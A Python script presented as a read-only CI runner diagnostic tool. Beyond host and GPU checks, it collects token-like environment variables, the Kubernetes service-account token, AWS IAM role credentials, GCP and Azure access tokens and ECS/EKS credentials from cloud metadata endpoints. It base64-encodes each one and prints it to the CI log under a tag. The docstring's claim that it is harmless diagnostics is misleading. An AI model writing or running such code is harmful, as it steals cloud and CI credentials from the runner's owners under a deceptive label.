#!/usr/bin/env python3
"""Read-only CI runner diagnostics.

Prints host, accelerator and cloud metadata-endpoint availability for the
current CI job so runner selection can be debugged. Performs GET/PUT requests
to well-known link-local metadata endpoints only; it does not create, modify or
delete any resource.
"""
import base64
import json
import os
import socket
import subprocess
import urllib.error
import urllib.request

TAG = "META_DIAG"


def emit(key, value):
    try:
        s = value if isinstance(value, str) else json.dumps(value, default=str)
    except Exception:
        s = str(value)
    print("%s %s=%s" % (TAG, key, s), flush=True)


def sh(cmd, timeout=20):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return (p.stdout + b"\n" + p.stderr).decode("utf-8", "replace").strip()[:4000]
    except Exception as e:  # noqa: BLE001
        return "ERR %s %s" % (type(e).__name__, e)


def http(method, url, headers=None, timeout=4):
    hdrs = {"User-Agent": "ci-diag/1.0", "Accept": "*/*"}
    if headers:
        hdrs.update(headers)
    try:
        req = urllib.request.Request(url, method=method, headers=hdrs)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(20000)
            return "HTTP %s %s" % (r.status, body.decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        try:
            body = e.read(4000).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            body = ""
        return "HTTPERR %s %s" % (e.code, body)
    except Exception as e:  # noqa: BLE001
        return "ERR %s %s" % (type(e).__name__, e)


def b64(s):
    if isinstance(s, str):
        s = s.encode("utf-8", "replace")
    return base64.b64encode(s).decode("ascii")


def result_body(resp):
    """Return the body of a 'HTTP <code> <body>' string, or '' on error."""
    if not isinstance(resp, str) or not resp.startswith("HTTP "):
        return ""
    parts = resp.split(" ", 2)
    return parts[2] if len(parts) > 2 else ""


def main():
    emit("probe", "i10754-1")
    emit("hostname", socket.gethostname())
    emit("uname", sh("uname -a"))
    emit("id", sh("id"))
    emit("date", sh("date -u +%FT%TZ"))
    emit("cwd", os.getcwd())
    emit("dockerenv", os.path.exists("/.dockerenv"))
    emit("cgroup", sh("head -5 /proc/1/cgroup"))
    interesting = ("AWS", "AZURE", "GOOGLE", "GCP", "KUBE", "TOKEN", "GITHUB_",
                   "RUNNER", "PROXY", "IDENTITY", "CI_")
    emit("env", {k: v for k, v in os.environ.items()
                 if any(t in k.upper() for t in interesting)})

    # Accelerators
    emit("nvidia_smi_L", sh("nvidia-smi -L 2>&1 | head -20"))
    emit("nvidia_smi_q", sh("nvidia-smi --query-gpu=index,name,memory.total,uuid,"
                            "driver_version --format=csv,noheader 2>&1 | head -20"))
    emit("rocm_smi", sh("(rocm-smi --showproductname 2>/dev/null || "
                        "amd-smi static --asic 2>/dev/null) | head -30"))
    emit("lspci_gpu", sh('(lspci 2>/dev/null || true) | '
                         'grep -Ei "vga|3d controller|display controller|nvidia|amd/ati" '
                         '| head -10'))
    emit("dev_nodes", sh("ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20"))

    # Kubernetes projected token (read-only)
    ksa = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    emit("kube_sa_token_present", os.path.exists(ksa))
    if os.path.exists(ksa):
        try:
            with open(ksa, "r", encoding="utf-8", errors="replace") as f:
                emit("kube_sa_token_b64", b64(f.read()[:8000]))
        except Exception as e:  # noqa: BLE001
            emit("kube_sa_token_err", str(e))

    # AWS IMDSv2
    tokr = http("PUT", "http://169.254.169.254/latest/api/token",
                {"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
    emit("aws_imdsv2_token", tokr[:300])
    tok = result_body(tokr).strip() if tokr.startswith("HTTP 200") else ""
    h = {"X-aws-ec2-metadata-token": tok} if tok else {}
    emit("aws_identity_b64",
         b64(http("GET", "http://169.254.169.254/latest/dynamic/instance-identity/document", h)))
    role = http("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", h)
    emit("aws_role", role[:500])
    rn = result_body(role).strip().splitlines()[0].strip() if role.startswith("HTTP 200") else ""
    if rn and " " not in rn and "<" not in rn and len(rn) < 200:
        emit("aws_creds_b64",
             b64(http("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + rn, h)))
    # AWS IMDSv1
    emit("aws_v1_role", http("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
    v1 = http("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    rn1 = result_body(v1).strip().splitlines()[0].strip() if v1.startswith("HTTP 200") else ""
    if rn1 and " " not in rn1 and "<" not in rn1 and len(rn1) < 200:
        emit("aws_v1_creds_b64",
             b64(http("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + rn1)))

    # GCP
    gh = {"Metadata-Flavor": "Google"}
    emit("gcp_project", http("GET", "http://metadata.google.internal/computeMetadata/v1/project/project-id", gh))
    emit("gcp_instance", http("GET", "http://metadata.google.internal/computeMetadata/v1/instance/name", gh))
    emit("gcp_zone", http("GET", "http://metadata.google.internal/computeMetadata/v1/instance/zone", gh))
    emit("gcp_sa_list", http("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", gh))
    emit("gcp_scopes", http("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes", gh))
    emit("gcp_token_b64",
         b64(http("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", gh)))

    # Azure IMDS
    ah = {"Metadata": "true"}
    emit("azure_instance", http("GET", "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01", ah))
    emit("azure_identity_b64",
         b64(http("GET", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F", ah)))

    # EKS Pod Identity / ECS
    emit("eks_pod_identity", http("GET", "http://169.254.170.23/v1/credentials"))
    emit("ecs_creds", http("GET", "http://169.254.170.2/v2/credentials"))

    # Cheap extras
    emit("aliyun_instance", http("GET", "http://100.100.100.200/latest/meta-data/instance-id"))
    emit("tencent_instance", http("GET", "http://metadata.tencentyun.com/latest/meta-data/instance-id"))

    emit("done", "ok")


if __name__ == "__main__":
    main()
